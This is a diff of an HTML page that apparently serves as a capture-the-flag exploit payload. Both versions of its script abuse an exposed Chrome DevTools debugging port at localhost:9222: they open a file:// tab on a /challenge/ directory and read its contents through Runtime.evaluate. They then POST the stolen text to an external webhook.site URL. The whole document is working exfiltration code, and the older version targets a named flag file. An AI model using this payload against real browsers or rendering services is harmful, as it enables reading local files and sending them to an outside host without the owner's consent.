@@ -2,55 +2,41 @@
 <!doctype html>
 <html>
 <body>
-<pre id="out">Starting CDP test...</pre>
+<pre id="out">Starting...</pre>
 <script>
 (async () => {
   const out = document.getElementById("out");
-  const webhook =
-    "https://webhook.site/cc90bdd9-e54f-4fae-865b-e49f3735034c";
+  const hook = "https://webhook.site/cc90bdd9-e54f-4fae-865b-e49f3735034c";
 
-  async function report(value) {
-    out.textContent = value;
-    try {
-      await fetch(webhook, {
-        method: "POST",
-        mode: "no-cors",
-        body: value
-      });
-    } catch (e) {
-      out.textContent += "\nWebhook error: " + e;
-    }
+  function report(x) {
+    out.textContent = String(x);
+    return fetch(hook, {
+      method: "POST",
+      mode: "no-cors",
+      body: String(x)
+    }).catch(() => {});
   }
 
   try {
-    const path =
-      "/challenge/flag-53035d3cba0664dfac37ff64b6e0f86e";
-
-    const response = await fetch(
-      "http://localhost:9222/json/new?file://" + path,
+    const r = await fetch(
+      "http://localhost:9222/json/new?file:///challenge/",
       { method: "PUT" }
     );
-
-    const tab = await response.json();
+    const tab = await r.json();
     const ws = new WebSocket(tab.webSocketDebuggerUrl);
 
     ws.onopen = () => {
       ws.send(JSON.stringify({
         id: 1,
         method: "Runtime.evaluate",
-        params: {
-          expression: "document.body.innerText"
-        }
+        params: { expression: "document.body.innerHTML" }
       }));
     };
 
-    ws.onmessage = async (event) => {
-      await report(event.data);
-    };
-
-    ws.onerror = () => report("CDP WebSocket connection failed");
-  } catch (error) {
-    await report("Error: " + String(error));
+    ws.onmessage = e => report(e.data);
+    ws.onerror = () => report("WebSocket connection failed");
+  } catch (e) {
+    report("Error: " + String(e));
   }
 })();
 </script>
